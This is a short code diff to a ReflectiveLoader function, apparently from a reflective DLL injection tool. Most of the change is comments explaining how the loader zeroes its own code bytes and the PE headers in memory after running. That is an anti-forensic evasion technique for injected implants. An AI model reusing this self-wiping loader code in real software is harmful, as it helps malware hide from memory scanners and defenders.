@@ -613,11 +613,19 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
 
     DWORD bytesToOverwrite = 0;
 
-    // Below meaningless if statement is placed here merely to let the further code compute number of bytes that should
-    // get overwritten.
+    // Below meaningless if statement is placed here merely to let the further code compute 
+    // number of bytes that should get overwritten.
     if (uiValueA == 'ABCD') {
         uiHeaderValue ^= 0xAF;
     }
+
+    //
+    // Above code will consist of a stream of 0x00 bytes.
+    //
+    // v------------------------------------------------^
+    //
+    // Below code remains intact (not overwritten).
+    //
 
     const DWORD offset = (((DWORD)((BYTE*)&ReflectiveLoader)) & 0xfff);
     BYTE* ptr = (BYTE*)&ReflectiveLoader;
@@ -627,6 +635,11 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
         if (*(DWORD*)&ptr[bytesToOverwrite] == 'ABCD') {
 
             if (pVirtualProtect(ptr, bytesToOverwrite, PAGE_EXECUTE_READWRITE, &oldProt)) {
+
+                //
+                // Overwrites ReflectiveLoader function's bytes up to the above
+                // if (value == 'ABCD') statement.
+                //
                 for (unsigned int i = 0; i < bytesToOverwrite; i++)
                     *ptr++ = 0;
 
@@ -643,6 +656,8 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
     uiValueB = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
     uiValueC = uiBaseAddress;
 
+    // Finally, wipe PE headers residing on the beginning of the allocation with
+    // this Reflective Loader.
     while (uiValueB--)
         *(BYTE*)uiValueC++ = 0;
 
